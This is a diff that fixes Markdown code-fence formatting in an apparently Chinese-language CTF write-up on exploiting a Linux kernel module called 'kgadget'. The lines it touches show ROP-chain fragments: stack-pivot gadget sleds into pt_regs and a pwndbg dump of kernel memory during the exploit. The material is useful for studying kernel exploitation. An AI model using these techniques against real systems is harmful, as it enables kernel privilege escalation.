@@ -181,7 +181,7 @@ int __fastcall kgadget_open(inode *__inode, file *__file)
 
 利用这个`gadget`偏移到`pt_regs`内跳到`r9 = pop rsp ; ret`，`r8 = try_hit`
 
-```1
+```c
 for(;idx < (page_size/8 - 0x30);idx++){
         rop[idx]=add_rsp_a0_pop_rbx_r12_r13_rbp_ret;
     }
@@ -189,7 +189,7 @@ for(;idx < (page_size/8 - 0x30);idx++){
 
 保证了`rsp`的步长
 
-```2
+```c
 for(;idx < (page_size/8 - 0x10);idx++){
         rop[idx]=ret;
     }
@@ -343,7 +343,9 @@ struct pt_regs {
 
 之后再`rsp & 0xFFFFFFFFFFFFF000`定位到栈的最顶端
 
-```这是kgadget中用gdb查看的执行exp时的内核布局
+这是 kgadget 中用 gdb 查看的执行 exp 时的内核布局：
+
+```text
 pwndbg> x/40gx 0xffffc9000018ff58
 0xffffc9000018ff58:	0x3361626e74747261	0x3361626e74747261
 0xffffc9000018ff68:	0x3361626e74747261	0x3361626e74747261
